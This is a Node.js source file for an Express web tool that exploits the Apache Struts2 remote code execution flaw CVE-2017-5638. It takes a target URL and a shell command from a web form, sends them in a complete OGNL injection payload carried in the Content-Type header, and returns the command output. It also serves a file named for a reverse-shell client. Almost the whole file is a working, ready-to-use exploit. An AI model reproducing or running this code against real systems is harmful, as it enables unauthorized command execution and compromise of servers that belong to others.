/**
 *  Experiment CVE-2017-5638
 *  node.js Remote Code Execution program
 *  Exploit Reference @ https://github.com/rapid7/metasploit-framework/issues/8064
 */
var express = require('express')
var bodyParser = require('body-parser')
var request = require('request')
var argv = require('argv')
var errorhandler = require('errorhandler')

var app = express()

/* eslint no-undef: 'error' */
/* global  DEFAULT_PORT:true REVERSE_SHELL_SCRIPT:true */
DEFAULT_PORT = '8081'
REVERSE_SHELL_SCRIPT = 'reverseShellClient.js'

argv.option([
  {
    name: 'port',
    short: 'p',
    type: 'int'
  }
])

var args = argv.run()
var p = (args.options.port) ? args.options.port : DEFAULT_PORT
var revURL = '/' + REVERSE_SHELL_SCRIPT

app.set('views', __dirname)
app.set('view engine', 'ejs')

app.get('/', function (req, res) {
  res.sendFile('index.html', { root: __dirname })
})

// var jsonParser = bodyParser.json()
var urlencodedParser = bodyParser.urlencoded({extended: false})
app.post('/postPage', urlencodedParser, function (req, res) {
  if (!req.body) return res.sendStatus(400)

  var url = req.body.url
  var cmd = req.body.cmd
  Struts2Shell(url, cmd, function (err, data) {
    /* eslint handle-callback-err: ['error', 'error'] */
    if (err) {
      console.log(err.stack)
    }
    console.log(data)
    if (!data) return res.sendStatus(500)
    res.render('index', { message: data })
  })
})

app.get(revURL, function (req, res) {
  res.sendFile(REVERSE_SHELL_SCRIPT, { root: __dirname })
})

/* eslint handle-callback-err: ["error", "error"] */
app.use(function (req, res, next) {
  var error = new Error('Cannot ' + req.method + ' ' + req.path)
  error.status = 404
  next(error)
})
app.use(errorhandler())

app.listen(p, function () {
  console.log('Listening on ' + p)
})

function Struts2Shell (url, cmd, callback) {
  var payload = 'Content-Type:%{(#_=\'multipart/form-data\').'
  payload += '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
  payload += '(#_memberAccess?'
  payload += '(#_memberAccess=#dm):'
  payload += '((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).'
  payload += '(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).'
  payload += '(#ognlUtil.getExcludedPackageNames().clear()).'
  payload += '(#ognlUtil.getExcludedClasses().clear()).'
  payload += '(#context.setMemberAccess(#dm)))).'
  payload += '(#cmd=\'' + cmd + '\').'
  payload += '(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).'
  payload += '(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).'
  payload += '(#p=new java.lang.ProcessBuilder(#cmds)).'
  payload += '(#p.redirectErrorStream(true)).(#process=#p.start()).'
  payload += '(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).'
  payload += '(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).'
  payload += '(#ros.flush())}'

  var options = {
    url: url,
    headers: {
      'User-Agent': 'Mozilla/5.0',
      'Content-Type': payload
    }
  }

  request(options, function (err, response, body) {
    /* eslint eqeqeq: ["error", "always"] */
    if (!err && (response.statusCode === 200)) {
      callback(err, body)
    } else {
      callback(err, null)
    }
  })
}

// for testing
module.exports = app
